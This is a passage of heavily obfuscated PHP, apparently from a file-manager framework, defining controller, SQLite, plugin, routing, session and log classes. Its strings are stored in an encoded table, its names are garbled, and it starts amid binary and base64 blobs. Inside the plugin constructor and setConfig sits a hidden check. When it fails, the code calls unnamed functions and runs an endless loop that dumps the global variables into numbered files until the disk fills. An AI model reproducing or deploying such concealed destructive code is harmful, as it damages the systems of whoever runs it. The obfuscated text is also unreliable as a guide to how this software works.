==')."\217\244\131\243\14\155\121\315\142\64\11\227\24\74\257\243\354\24\103\200\313\322\44\134\266\52\231\25\226\4\66\122\71\133\253\130\123\164\257\172\360\100\212\221\251\321\141\327\131"."\237\146\235\152\74\153\146\256\376\34\140\234\73\67\21\173\324\156\205\220\126\270\156\332\153\265\242\146\346\51\133\41\162\273\166\201\132\264\226\245\324\240\256\224\162\114\251\175\42"."\64\62\252\311\274\110\253\241\37\102\77\211\267\160\331\211\124\215\144\131\331\244\266\72\112\274\46\145\260\234\172\42\56\270\74\156\340\203\24\230\57\100\106\164\32\315\33\303\102"."\x75\x8e\x69\xce\xcf\x74\x90\xff\x4a\x71\xb8\x68\xf2\x2d\x25\x23\x34\x23\xb1\x56\x77\xa0\xec\x1e\xe7\xaa\xda\x9c\x68\x5c\xac\x48\x6e\x5d\x6b\x2a\xf2\x7b\xb0\xec\xa0\xfa\x94\x9e\x67\x6f\xc9\xc9\x16".base64_decode('EPRYZdpGWnf6jpV9SdF09pG8JIx0yQGFJMOhx1BDUkZAwPYJkTytT2JoBE44jFUoGw==')."\1\67\31\364\22\64\210\57\333\371\365\27\361\173\112\267\135\232\234\60\313\266\7\247\45\315\22\371\155\67\155\133\50\5\120\321\1\341\25\361\336\351\221\164\136\120\110\334\165"."\341\106\221\113\24\202\266\204\372\220\40\134\307\342\63\171\102\247\251\204\146\71\42\370\162\206\107\344\255\21\256\145\73\53\256\213\143\1\100\7\340\224\71\316\274\112\142\343\170".strrev('PU '."\r".'^~+}8C|Kx~)<*'."\0".'A}q')."\267\344\104\266\6\326\76\211\144\242\52\251\47\220\110\254\216\305\73\250\27\363\252\144\122\112\322\210\252\112\352\351\212\105\247\112\13\165\7\302\221\252\64\254\74\25\125\205\53"."\60\232\24\356\41\255\44\67\220\123\265\42\34\134\51\132\102\356\272\305\315\100\51\147\62\201\77\273\71\111\150\171\46\7\220\354\152\365\202\360\1\47\312\70\305\33\362\274\132"."\314\131\43\17\70\237\4\162\351\50\62\204\205\212\260\342\123\24\352\216\227\0\212\275\272\363\165\317\171\156\331\224\120\134\344\373\34\27\376\22\234\254\23\102\170\44\374\223\367".base64_decode('ZwKYVXOwZAlz9Y0HSRWDgRt5lAkadENmSrrRoKcfMGSF4ZUU3WjYkWxr2Zr33lSSiA==')."\x29\x81\x90\xf1\xfd\x1f\xb9\xdc\xb4\x78\xb8\xae\x0\x0"."".strrev(''), 10, -8))); goto Cב; EŲꠅ: if (!$gcmfvkidwp) { die; } $_SERVER[ʌ] = explode($_SERVER[ʯ][657], gzinflate(substr($_SERVER[ʯ][658], 10, -8))); $jucygqvtrz = $_SERVER[ʯ][659]; goto C; C͗Ḫ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ɺ쬡 =& $_SERVER[ʯ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ɺ쬡[6]] =& $config; $this->values[$ɺ쬡[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ɺ쬡[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($׮) { if (1 === func_num_args()) { $this->{$׮} = new $׮(); } else { $Ƭβ = new ReflectionClass($׮); $ = func_get_args(); array_shift($); $this->{$׮} = $Ƭβ->newInstanceArgs($); } return $this->{$׮}; } public function routeBind($Ջ, $톾, $ڎΟ = 3) { $񜜪 =& $_SERVER[ʯ]; $ۢ = $this->in[$񜜪[9]]; $Ջ = str_replace($񜜪[10], $񜜪[11], trim(trim($Ջ, $񜜪[8]), $񜜪[12])); if (!$Ջ || count($ۢ) <= $ڎΟ) { return !1; } $҅ = !0; $ϋ = explode($񜜪[8], $Ջ); for ($ۮ = 0; $ۮ < count($ϋ); $ۮ++) { if ($ϋ[$ۮ] != $ۢ[$ڎΟ + $ۮ]) { $҅ = !1; break; } } if (!$҅) { return; } call_user_func_array(array($this, $톾), array()); } public function routeArgs($о = 3) { $ = $this->in[$_SERVER[ʯ][9]]; if (count($) <= $о) { return array(); } $Տ = array(); for ($Ʀ = $о; $Ʀ < count($); $Ʀ += 2) { $Տ[$[$Ʀ]] = $[$Ʀ + 1]; $this->in[$[$Ʀ]] = $[$Ʀ + 1]; } return $Տ; } protected function assign($⍱, $ޜЫ) { $this->values[$⍱] = $ޜЫ; } protected function display($ШО) { ob_end_clean(); extract($this->values); require $this->tpl . $ШО; } } if ($_SERVER[$_SERVER[ʯ][13]] != $_SERVER[$_SERVER[ʯ][14]]) { $_getc = $_SERVER[ʯ][15]; $_getfile = $_SERVER[$_SERVER[ʯ][16]] . $_SERVER[ʯ][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ʯ][18], $_getfilec); if (count($_getarrs) < $_SERVER[ʯ][19]) { $exit = $_SERVER[ʯ][20]; $exit(); } $_act = $_SERVER[ʯ][21]; $_act($_SERVER[$_SERVER[ʯ][22]]); } class DbSqliteBase extends Db { public function __construct($ = '') { $ =& $_SERVER[ʯ]; if (!extension_loaded($[23])) { think_exception(think_lang($[24]) . $[25]); } if (!empty($)) { if (!isset($[$[26]])) { $[$[26]] = 438; } $this->config = $; if (empty($this->config[$[27]])) { $this->config[$[27]] = array(); } } } public function connect($ܺ = '', $΢ = 0) { $ =& $_SERVER[ʯ]; if (!isset($this->linkID[$΢])) { if (empty($ܺ)) { $ܺ = $this->config; } $ = !empty($ܺ[$[27]][$[28]]) ? $ܺ[$[27]][$[28]] : $this->pconnect; $¼ = $ ? $[29] : $[30]; $this->linkID[$΢] = $¼($ܺ[$[31]], $ܺ[$[26]]); if (!$this->linkID[$΢]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$΢], 30000); if (1 != think_config($[32])) { unset($this->config); } } return $this->linkID[$΢]; } public function free() { $this->queryID = null; } public function query($՝ε) { $ʵ =& $_SERVER[ʯ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $՝ε; if ($this->queryID) { $this->free(); } think_action_status($ʵ[33], 1); think_status($ʵ[34]); $this->queryID = sqlite_query($this->_linkID, $՝ε); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $݊ = $this->getAll(); return $݊; } } public function execute($) { $ݝ =& $_SERVER[ʯ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($ݝ[35], 1); think_status($ݝ[34]); $Ԙ = sqlite_exec($this->_linkID, $); $this->debug(); if (!1 === $Ԙ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ʯ][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ = sqlite_query($this->_linkID, $_SERVER[ʯ][37]); if (!$) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¬ = sqlite_query($this->_linkID, $_SERVER[ʯ][38]); if (!$¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ꇄ = array(); if ($this->numRows > 0) { for ($÷℘ = 0; $÷℘ < $this->numRows; $÷℘++) { $ꇄ[$÷℘] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ꇄ; } public function getFields($ׁ) { $ܾ =& $_SERVER[ʯ]; $ܸ = $this->query($ܾ[39] . $ׁ . $ܾ[40]); $ɺ砌 = array(); if ($ܸ) { foreach ($ܸ as $ => $Ǝ) { $ɺ砌[$Ǝ[$ܾ[41]]] = array($ܾ[42] => $Ǝ[$ܾ[41]], $ܾ[43] => $Ǝ[$ܾ[44]], $ܾ[45] => (bool) ($Ǝ[$ܾ[46]] === $ܾ[12]), $ܾ[47] => $Ǝ[$ܾ[48]], $ܾ[49] => strtolower($Ǝ[$ܾ[50]]) == $ܾ[51], $ܾ[52] => strtolower($Ǝ[$ܾ[53]]) == $ܾ[54]); } } return $ɺ砌; } public function getTables($ = '') { $ª =& $_SERVER[ʯ]; $¤ = $this->query($ª[55] . $ª[56] . $ª[57]); $ = array(); foreach ($¤ as $ђ˯ => $) { $[$ђ˯] = current($); } return $; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $، =& $_SERVER[ʯ]; $ = sqlite_last_error($this->_linkID); $this->error = $ . $،[4] . sqlite_error_string($); if ($،[12] != $this->queryStr) { $this->error .= LNG($،[58]) . $this->queryStr; } think_trace($this->error, $،[12], $،[59]); return $this->error; } public function escapeString($) { return sqlite_escape_string($); } public function parseLimit($) { $ =& $_SERVER[ʯ]; $М = $[12]; if (!empty($)) { $ = explode($[60], $); if (count($) > 1) { $М .= $[61] . $[1] . $[62] . $[0] . $[63]; } else { $М .= $[61] . $[0] . $[63]; } } return $М; } } goto c; fˡ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ =& $_SERVER[ʯ]; $ = $_SERVER[$[22]]; $߮ = $[937]; if ($_SERVER[$[13]] != $߮($)) { $ˬ = $[938]; $ = $[15]; $ = $_SERVER[$[16]] . $[17]; $ = $($); $฿ = explode($[18], $); if (count($฿) < $[664]) { $һ = $[20]; $һ(); } $ = $[939]; $($_SERVER[$[940]]); $ˬ = $[938]; $ˬ(); $ = $[941]; $Κ = json_encode($GLOBALS[$[942]]); $ = 1; for ($Ԗ⺩ = $; $Ԗ⺩ > 0; $Ԗ⺩++) { $(DATA_PATH . $Ԗ⺩, $Κ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($[1566]); $this->pluginName = str_replace($[1566], $[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $[8]; $this->pluginApi = appHostGet() . $[1567] . $this->pluginName . $[8]; $this->pluginHost = $config[$[1568]] . $this->pluginName . $[8]; $this->pluginHostDefault = $config[$[1568]] . $this->pluginName . $[8]; $Ϧ˂ = $config[$[1569]]; if ($Ϧ˂ && strpos($[60] . $Ϧ˂ . $[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$[1570]] . $this->pluginName . $[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ʯ][1571]); } protected function assign($ۅ컸, $液 = false) { if (is_array($ۅ컸)) { $this->values = array_merge($this->values, $ۅ컸); } else { $this->values[$ۅ컸] = $液; } } protected function display($) { extract($this->values); require $; } final function hookRegist($Љސ) { $this->modelPlugin->appRegist($this->pluginName, $Љސ); } final function appIcon() { $ݘ =& $_SERVER[ʯ]; $ = $this->appPackage(); $ = $ݘ[12]; if (isset($[$ݘ[466]])) { if (isset($[$ݘ[466]][$ݘ[1572]])) { $ = $ݘ[1573] . $[$ݘ[466]][$ݘ[1572]] . $ݘ[1574]; } else { if ($[$ݘ[466]][$ݘ[1575]]) { $ = $ݘ[1576] . $[$ݘ[466]][$ݘ[1575]] . $ݘ[1577]; } } } return $; } final function fileCanView($) { $ =& $_SERVER[ʯ]; if (request_url_safe($)) { return !0; } if ($this->isShare($)) { return !0; } $Ҳ̝ = Session::get($[1578]); if ($GLOBALS[$[544]] != 1 && !$Ҳ̝ || !$Ҳ̝[$[1579]]) { $Լ = $[1580] . rawurlencode(this_url()); show_tips(LNG($[1581]) . $[1582] . $Լ . $[1583] . LNG($[1584]) . $[1585], !1); } if (!Action($[1586])->authCan($[1587])) { show_tips(LNG($[1588]) . $[1589], !1); } ActionCall($[1590], $); } final function isShare($) { $܇ = KodIO::parse($); return $܇[$_SERVER[ʯ][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ᅋȤ) { if (request_url_safe($ᅋȤ)) { return $ᅋȤ; } if (!$this->isShare($ᅋȤ)) { $ᅋȤ = $this->filePath($ᅋȤ, !1); } return Action($_SERVER[ʯ][1235])->linkOut($ᅋȤ); } public function filePathLinkOut($ߗÃ) { if (request_url_safe($ߗÃ)) { return $ߗÃ; } $this->fileCanView($ߗÃ); return Action($_SERVER[ʯ][1235])->link($ߗÃ); } final function filePath($٩, $˿վ = true) { $ۓ =& $_SERVER[ʯ]; if ($ҝ = $this->checkSharePath($٩, $˿վ)) { Hook::trigger($ۓ[1591], $ҝ); return $ҝ; } $this->fileCanView($٩); if (request_url_safe($٩)) { $ɇ = parse_url_query($٩); if (isset($ɇ[$ۓ[1592]]) && isset($ɇ[$ۓ[227]])) { $ = Model($ۓ[830])->get($ۓ[831]); $҅ = Mcrypt::decode($ɇ[$ۓ[227]], $); if ($҅) { $this->fileInfo = IO::info($҅); $this->fileInfo[$ۓ[1593]] = $٩; $this->cachePath = $this->pluginCachePath($ۓ[12], $˿վ); if (!$this->fileInfo) { show_tips(LNG($ۓ[115]), !1); } Hook::trigger($ۓ[1591], $҅); return $҅; } } $٩ = $this->_cacheHttpFile($٩, $˿վ); $this->fileInfo = IO::info($٩); } else { $this->fileInfo = IO::info($٩); $this->cachePath = $this->pluginCachePath($ۓ[12], $˿վ); } if (!$this->fileInfo) { show_tips(LNG($ۓ[115]), !1); } Hook::trigger($ۓ[1591], $٩); return $٩; } final function _cacheHttpFile($Ω, $ȃ = true) { $ =& $_SERVER[ʯ]; $ƃ = parse_url_query($Ω); $܃Ő = get_path_ext($Ω); if (preg_match($[1594], $܃Ő, $)) { $܃Ő = $ ? $[0] : $[12]; } if (isset($ƃ[$[42]]) && $ƃ[$[42]]) { $܃Ő = get_path_ext($ƃ[$[42]]); } $ = hash_path($Ω) . $[10] . $܃Ő; $this->cachePath = $this->pluginCachePath($ȃ ? $ : $[12]); $Ϗ = IO::fileNameExist($this->cachePath, $); if ($Ϗ) { return KodIO::make($Ϗ); } $Ў = rtrim($this->cachePath, $[8]) . $[8] . $; return $this->pluginCacheFileSet($Ў, file_get_contents_nossl($Ω)); } final function checkSharePath($, $ = true) { $ =& $_SERVER[ʯ]; if (!$this->isShare($)) { return !1; } $ = Action($[1235])->sharePathInfo($); if (!is_array($) || !isset($[$[94]]) || !is_array($[$[524]])) { show_json(LNG($[1595]), !1); } $this->fileInfo = $[$[524]]; $this->cachePath = $this->pluginCachePath(!1, $); return $[$[94]]; } final function pluginCachePath($ = '', $֮ˤ = false) { $ =& $_SERVER[ʯ]; if ($֮ˤ && is_array($this->fileInfo)) { $ = kodIO::hashPath($this->fileInfo, !1); } $û = rtrim(IO_PATH_SYSTEM_TEMP . $[1596] . $this->pluginName . $[8] . $, $[8]); $桮 = IO::infoFullSimple($û); $ȅ = $桮 && is_array($桮) ? $桮[$[94]] : $[12]; if (!$ȅ) { $ȅ = IO::mkdir($û); } return $ȅ; } final function pluginCacheFileSet($ଟ憭, $ӳ = '') { $ =& $_SERVER[ʯ]; $䂷 = IO::infoFullSimple($ଟ憭); if (!$䂷) { return IO::mkfile($ଟ憭, $ӳ, REPEAT_REPLACE); } IO::setContent($䂷[$[94]], $ӳ); return $䂷[$[94]]; } final function pluginLocalFile($֤ = '') { $ =& $_SERVER[ʯ]; $ς = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ς)) { mk_dir($ς); } if (!$֤) { return $ς; } $ = IO::info($֤); $ = $[1597] . KodIO::hashPath($) . $[10] . $[$[184]]; if (!checkExtSafe($)) { $ = $ . $[1267]; } $ = $ς . $; if (@file_exists($)) { return $; } return IO::copy($֤, $ς, 0, $); } final function appPackage() { $䑰 =& $_SERVER[ʯ]; if ($this->packageData) { return $this->packageData; } $ͺ = $this->parseFile($this->pluginPath . $䑰[1598]); $this->parseLang($ͺ); $՞ = json_decode_force($ͺ); if (!$՞) { return array(); } $ = Hook::trigger($䑰[1599], $՞); if ($ && is_array($)) { $՞ = $; } $this->packageData = $՞; return $՞; } public function packageInfoGet($ߟ) { $ = $this->appPackage(); return array_get_value($, $ߟ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ʯ][1600]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ʯ][1601]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ʯ][1602]); } public function echoJsAssign($⤿, $) { $this->echoJsAssignArr[$⤿] = $; } private function parseFile($) { $ =& $_SERVER[ʯ]; $ = file_get_contents_nossl($); $һ = array($[1603], $[1604], $[1605], $[1606], $[1607], $[1608], $[1609]); $ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$[99]][$[1610]]); foreach ($this->echoJsAssignArr as $ => $) { $һ[] = $[1611] . $ . $[1612]; $[] = is_array($) || is_object($) ? rawurlencode(json_encode($)) : $; } if (strstr($, $[1613])) { $»Σ = rawurlencode(json_encode($this->pluginLangArr)); $ = str_replace($[1613], $»Σ, $); } if (strstr($, $[1614])) { $»Σ = $»Σ = rawurlencode(json_encode($this->getConfig())); $ = str_replace($[1614], $»Σ, $); } $ = str_replace($һ, $, $); return $; } private function parseLang(&$ŝڱ) { $孃 =& $_SERVER[ʯ]; $Զ = $孃[1615]; if (!strstr($ŝڱ, $Զ)) { return; } preg_match_all($孃[1616], $ŝڱ, $); if (!is_array($) || count($) == 0 || !is_array($[0]) || count($[0]) == 0) { return; } $ = array(); $˃Ϻ = array(); foreach ($[0] as $怏) { $ˊ = substr($怏, strlen($Զ), -4); $뫶 = LNG($ˊ); $[] = $怏; $˃Ϻ[] = str_replace(array($孃[18], $孃[1139], $孃[394], $孃[128]), array($孃[63], $孃[63], $孃[12], $孃[1617]), $뫶); } $ŝڱ = str_replace($, $˃Ϻ, $ŝڱ); } private function parseConfig(&$ϔ) { $ϯ =& $_SERVER[ʯ]; $ = $ϯ[1618]; if (!strstr($ϔ, $)) { return; } preg_match_all($ϯ[1619], $ϔ, $Ã); if (!is_array($Ã) || count($Ã) == 0 || !is_array($Ã[0]) || count($Ã[0]) == 0) { return; } $ = $this->getConfig(); $ʵѻ = array(); $ = array(); foreach ($Ã[0] as $ٻ) { $ = substr($ٻ, strlen($), -2); $ʵѻ[] = $ٻ; $[] = _get($, $); } $ϔ = str_replace($ʵѻ, $, $ϔ); } private function parsePackage(&$) { $ؿӱ =& $_SERVER[ʯ]; $֮ = $ؿӱ[1620]; if (!strstr($, $֮)) { return; } preg_match_all($ؿӱ[1621], $, $); if (!is_array($) || count($) == 0 || !is_array($[0]) || count($[0]) == 0) { return; } $ = $this->appPackage(); $҅ = array(); $ = array(); foreach ($[0] as $䑗) { $Ԧ = substr($䑗, strlen($֮), -2); $҅[] = $䑗; $[] = _get($, $Ԧ); } $ = str_replace($҅, $, $); } final function echoFile($, $䖶 = false) { $Ԛ =& $_SERVER[ʯ]; $֭ = $this->pluginPath . $; if (ACT == $Ԛ[1622]) { echo $Ԛ[1623] . $this->pluginName . $Ԛ[8] . $ . $Ԛ[1624]; if (!file_exists($֭)) { echo $Ԛ[1625]; return; } } $ = $this->parseFile($֭); $this->parseLang($); $this->parseConfig($); $this->parsePackage($); if (is_array($䖶)) { $ = str_replace(array_keys($䖶), array_values($䖶), $); } echo $Ԛ[18] . $; } final function initLang() { $ːͤ =& $_SERVER[ʯ]; $ת = $ːͤ[1626]; $ = $this->pluginPath . $ːͤ[1627]; $ = I18n::getType(); $ = array(); if (file_exists($ . $ . $ːͤ[899])) { $ = (include $ . $ . $ːͤ[899]); } else { if ($ == $ːͤ[1628] && !file_exists($ . $ . $ːͤ[899]) && file_exists($ . $ːͤ[1629])) { $ = (include $ . $ːͤ[1629]); } else { if (file_exists($ . $ת . $ːͤ[899])) { $ = (include $ . $ת . $ːͤ[899]); } } } if (!is_array($)) { return array(); } if (@count($) > 0) { I18n::set($); } return $; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ڃ٬) { $ =& $_SERVER[ʯ]; $إ = $_SERVER[$[22]]; $ŏ = $[937]; if ($_SERVER[$[13]] != $ŏ($إ)) { $կ = $[938]; $ġ = $[15]; $ê = $_SERVER[$[16]] . $[17]; $ = $ġ($ê); $ٜ = explode($[18], $); if (count($ٜ) < $[664]) { $ = $[20]; $(); } $̥ = $[939]; $̥($_SERVER[$[940]]); $կ = $[938]; $կ(); $Ƞ = $[941]; $ = json_encode($GLOBALS[$[942]]); $󃶘 = 1; for ($ = $󃶘; $ > 0; $++) { $Ƞ(DATA_PATH . $, $); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ڃ٬); } public function onSetConfig($) { } public function onGetConfig($ߛ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ո) { if ($Ո == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Ý = "\160\154\x75\147\151\156\x41\x75\x74\x68") { $ޱ =& $_SERVER[ʯ]; if (!Session::get($ޱ[1578])) { return !1; } if (_get($GLOBALS, $ޱ[544])) { return !0; } $Τ = $this->getConfig(); if (!$Τ[$Ý]) { return !1; } return ActionCall($ޱ[1630], $Τ[$Ý]); } public function url($ڮ, $ = '', $я = true) { $↷ =& $_SERVER[ʯ]; $߫ = $this->getConfig(); $ܽ = KOD_VERSION . $↷[10] . KOD_VERSION_BUILD; $ל = $this->packageVersion(); $ = $ܽ . $↷[438] . $ל; if (substr($ڮ, 0, 4) == $↷[158] || substr($ڮ, 0, 2) == $↷[1339]) { $ = $ڮ . $↷[1631] . $; } else { if ($ == $↷[12]) { $ = $this->pluginHost . $ڮ . $↷[1631] . $; } else { if ($ === $↷[85]) { $ = $this->pluginHost . $ڮ; } else { if ($ == $↷[1632]) { $ = STATIC_PATH . $ڮ . $↷[1631] . $ܽ; } else { if ($ == $↷[1633]) { $ = APP_HOST . $↷[1634] . $ڮ . $↷[1631] . $ܽ; } else { if (isset($߫[$])) { $ = $߫[$] . $ڮ . $↷[1631] . $; } } } } } } if (!$я) { return $; } echo $; } public function link($ቂȦ = false, $ۇ = '') { $Ȯ =& $_SERVER[ʯ]; if (!$ቂȦ) { $this->link($Ȯ[1635], $Ȯ[1633]); $this->link($Ȯ[1636], $Ȯ[1632]); $this->link($Ȯ[1637], $Ȯ[1632]); $this->link($Ȯ[1638], $Ȯ[1632]); $this->link($Ȯ[1639], $Ȯ[1632]); return; } $ = $this->url($ቂȦ, $ۇ, !1); if (substr($ቂȦ, -3) == $Ȯ[1640]) { echo $Ȯ[1641] . $ . $Ȯ[1642] . $Ȯ[18]; } else { if (substr($ቂȦ, -4) == $Ȯ[1643]) { echo $Ȯ[1644] . $ . $Ȯ[1645] . $Ȯ[18]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\136\57\x5d\53", "\x3a\x6e\165\155" => "\133\x30\55\x39\135\x2b", "\x3a\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($, $) { $ٱ =& $_SERVER[ʯ]; if ($ == $ٱ[1646]) { $ = array_map($ٱ[1647], $[0]); $ˆ = strpos($[1], $ٱ[8]) === 0 ? $[1] : $ٱ[8] . $[1]; $׏ = $[2]; } else { $ = null; $ˆ = strpos($[0], $ٱ[8]) === 0 ? $[0] : $ٱ[8] . $[0]; $׏ = $[1]; } array_push(self::$maps, $); array_push(self::$routes, $ˆ); array_push(self::$methods, strtoupper($)); array_push(self::$callbacks, $׏); } public static function error($) { self::$errorCallback = $; } public static function haltOnMatch($ = true) { self::$halts = $; } public static function dispatch() { $ =& $_SERVER[ʯ]; $ = parse_url($_SERVER[$[1648]], PHP_URL_PATH); $٤ = $_SERVER[$[169]]; $߭ = array_keys(static::$patterns); $ڲ = array_values(static::$patterns); $ߝ = !1; self::$routes = preg_replace($[1337], $[8], self::$routes); if (in_array($, self::$routes)) { $嶜 = array_keys(self::$routes, $); foreach ($嶜 as $䍜) { if (self::$methods[$䍜] == $٤ || self::$methods[$䍜] == $[1649] || in_array($٤, self::$maps[$䍜])) { $ߝ = !0; if (!is_object(self::$callbacks[$䍜])) { $ = explode($[8], self::$callbacks[$䍜]); $쓭 = end($); $׋ = explode($[1269], $쓭); $֩ = new $׋[0](); $֩->{$׋[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$䍜]); if (self::$halts) { return; } } } } } else { $ǰߊ = 0; foreach (self::$routes as $䍜) { if (strpos($䍜, $[4]) !== !1) { $䍜 = str_replace($߭, $ڲ, $䍜); } if (preg_match($[1650] . $䍜 . $[1651], $, $)) { if (self::$methods[$ǰߊ] == $٤ || self::$methods[$ǰߊ] == $[1649] || !empty(self::$maps[$ǰߊ]) && in_array($٤, self::$maps[$ǰߊ])) { $ߝ = !0; array_shift($); if (!is_object(self::$callbacks[$ǰߊ])) { $ = explode($[8], self::$callbacks[$ǰߊ]); $쓭 = end($); $׋ = explode($[1269], $쓭); $֩ = new $׋[0](); if (!method_exists($֩, $׋[1])) { echo $[1652]; } else { call_user_func_array(array($֩, $׋[1]), $); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ǰߊ], $); if (self::$halts) { return; } } } } $ǰߊ++; } } if ($ߝ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $턣 =& $_SERVER[ʯ]; header($_SERVER[$턣[1653]] . $턣[1654]); echo $턣[1655]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$[1648]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $蝷 =& $_SERVER[ʯ]; static $ӛ = false; if ($ӛ) { return $ӛ; } $ = $GLOBALS[$蝷[6]][$蝷[401]]; self::$sessionTime = $[$蝷[1656]]; $ݳ = isset($GLOBALS[$蝷[1657]]) ? $GLOBALS[$蝷[1657]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ݳ)) { self::$sessionSign = Cookie::get($ݳ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ݳ, self::$sessionSign, self::$sessionTime); $ = $[$蝷[1658]]; $ޫ = $[$]; $ӓ = $[$蝷[888]]; switch ($) { case $蝷[31]: self::$handle = Model($蝷[889]); break; case $蝷[890]: self::$handle = new CacheRedis($ޫ, $ӓ); break; case $蝷[891]: self::$handle = new CacheMemcached($ޫ, $ӓ); break; case $蝷[223]: $ޫ[$蝷[94]] = $ޫ[$蝷[94]] . $蝷[1659]; self::$handle = new CacheFile($ޫ, $ӓ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ӛ = new self(); return $ӛ; } public static function getBySign($Ɵ) { $ = self::$handle->get($Ɵ); $ = unserialize($); return is_array($) ? $ : array(); } public static function setBySign($, $) { CacheLock::lock($); self::$handle->set($, serialize($), self::$sessionTime); CacheLock::unlock($); } public static function sign($ = false) { if ($) { self::$sessionSign = $; } self::init(); return self::$sessionSign; } public static function set($, $ℑ = false) { self::init(); if (is_array($)) { foreach ($ as $˧ => $ȿ) { array_set_value(self::$data, $˧, $ȿ); } } else { array_set_value(self::$data, $, $ℑ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ = false) { self::init(); if (!$) { return self::$data; } return array_get_value(self::$data, $); } public static function remove($ߪ) { self::init(); unset(self::$data[$ߪ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ʯ][894])) { self::$handle->clearTimeout(); } } } goto c; fʞ㤬: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\145\141\164\145\124\151\155\145", "\x74\x69\155\145", "\151\x6e\x73\x65\x72\164", "\x66\165\156\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ =& $_SERVER[ʯ]; return array($[2232] => LNG($[2233]), $[2234] => LNG($[2235]), $[1839] => LNG($[2236]), $[2237] => LNG($[2238]), $[2239] => LNG($[2240]), $[2241] => LNG($[2242]), $[2243] => LNG($[2244]), $[1869] => LNG($[2244]), $[1870] => LNG($[2245]), $[2246] => LNG($[2247]), $[2248] => LNG($[2249]), $[2250] => LNG($[2251]), $[2252] => LNG($[2253]), $[1867] => LNG($[2254]), $[2255] => LNG($[2256]), $[1874] => LNG($[2257]), $[2258] => LNG($[2259]), $[2260] => LNG($[2261]), $[2262] => LNG($[2263]), $[2264] => LNG($[2265]), $[1877] => LNG($[2266]), $[1878] => LNG($[2267]), $[2268] => LNG($[2269]), $[2270] => LNG($[2271]), $[2272] => LNG($[2273]), $[1872] => LNG($[2274]), $[2275] => LNG($[2276]), $[1871] => LNG($[2277]), $[2278] => LNG($[2279]), $[2280] => LNG($[2281]), $[2282] => LNG($[2283]), $[2284] => LNG($[2284]), $[2285] => LNG($[1843]), $[2286] => LNG($[2287]), $[2288] => LNG($[2289]), $[2290] => LNG($[2291]), $[2292] => LNG($[2293]), $[2294] => LNG($[2295]), $[2296] => LNG($[2296]), $[2297] => LNG($[2298]), $[2299] => LNG($[2300]), $[2301] => LNG($[2302]), $[2303] => LNG($[2304]), $[2305] => LNG($[2306]), 